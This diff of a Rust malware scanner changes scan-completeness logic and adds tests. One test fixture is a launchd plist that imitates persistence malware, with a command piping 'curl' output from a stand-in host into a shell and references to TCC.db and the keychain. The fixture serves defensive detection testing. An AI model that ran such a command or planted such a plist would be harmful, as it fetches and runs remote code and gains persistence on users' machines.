@@ -68,9 +68,13 @@ pub fn scan_context(ctx: &ScanContext, rules: &[Box<dyn Rule>]) -> ScanResult {
         }
     }
 
+    // Truncation is a global completeness fact, not something individual rules
+    // track: a file read only up to the §-content cap (or a container member
+    // whose extraction stopped at a §6.2 limit) was not fully examined, so it
+    // can never be `Complete` even when every rule that ran found nothing.
     let completeness = if !ctx.readable() {
         ScanCompleteness::Indeterminate
-    } else if not_applicable_count > 0 {
+    } else if ctx.truncated || not_applicable_count > 0 {
         ScanCompleteness::Partial
     } else {
         ScanCompleteness::Complete
@@ -178,6 +182,90 @@ mod tests {
         );
         assert!(!r.signals.iter().any(|s| s.id == "unsigned-binary"));
         assert!(!r.signals.iter().any(|s| s.id == "quarantine-xattr-present"));
+    }
+
+    /// A single static artifact must not corroborate itself into a high-severity
+    /// verdict: a launchd plist that trips both `launchd-persistence-plist` and
+    /// `suspicious-strings` is two static reads of one file, not two independent
+    /// evidence families, so it stays capped at `Notify` even past the high
+    /// score threshold — both rules now share `StaticSuspicion` (NAV-002).
+    #[test]
+    fn one_static_artifact_cannot_reach_high_severity_alone() {
+        let plist = br#"<plist version="1.0"><dict>
+            <key>Label</key><string>com.x.updater</string>
+            <key>ProgramArguments</key>
+            <array><string>/bin/sh</string><string>-c</string>
+              <string>osascript -e run; curl -s https://x.test/a | sh; sqlite3 TCC.db; SecKeychain</string></array>
+            <key>RunAtLoad</key><true/>
+            <key>KeepAlive</key><true/>
+            <key>StartInterval</key><integer>10</integer>
+        </dict></plist>"#;
+        let r = scan_embedded_bytes(
+            "com.x.updater.plist",
+            plist.to_vec(),
+            false,
+            &default_ruleset(),
+        );
+
+        assert!(r
+            .signals
+            .iter()
+            .any(|s| s.id == "launchd-persistence-plist"));
+        assert!(r.signals.iter().any(|s| s.id == "suspicious-strings"));
+        assert!(
+            r.score >= HIGH_SCORE_THRESHOLD,
+            "score {} must clear the high threshold for this test to be meaningful",
+            r.score
+        );
+
+        let categories: HashSet<SignalCategory> = r
+            .signals
+            .iter()
+            .filter(|s| s.category != SignalCategory::Informational)
+            .map(|s| s.category)
+            .collect();
+        assert_eq!(
+            categories.len(),
+            1,
+            "two static rules on one artifact must not present as independent families: {categories:?}"
+        );
+        assert_ne!(
+            r.recommendation,
+            Recommendation::NotifyAndSuggestQuarantine,
+            "one static artifact must not reach the quarantine tier on category diversity alone"
+        );
+    }
+
+    /// Truncation alone downgrades completeness: a readable file examined only
+    /// up to the content cap is `Partial`, never `Complete`, even when no rule
+    /// objected — otherwise content placed past the read boundary reads as
+    /// absent (NAV-001 / §5.5).
+    #[test]
+    fn truncation_alone_prevents_a_complete_scan() {
+        use crate::context::{ContentSource, ScanContext};
+        use std::sync::OnceLock;
+
+        let ctx = |truncated: bool| ScanContext {
+            path: "big.bin".into(),
+            content: Some(b"benign".to_vec()),
+            truncated,
+            file_len: Some(u64::MAX),
+            identity: None,
+            source: ContentSource::File,
+            codesign_dv_cache: OnceLock::new(),
+            spctl_cache: OnceLock::new(),
+        };
+
+        // No rules object, so truncation is the only thing that can lower it.
+        let no_rules: [Box<dyn Rule>; 0] = [];
+        assert_eq!(
+            scan_context(&ctx(false), &no_rules).completeness,
+            ScanCompleteness::Complete
+        );
+        assert_eq!(
+            scan_context(&ctx(true), &no_rules).completeness,
+            ScanCompleteness::Partial
+        );
     }
 
     /// An extraction that stopped at a budget must not be scored as if the
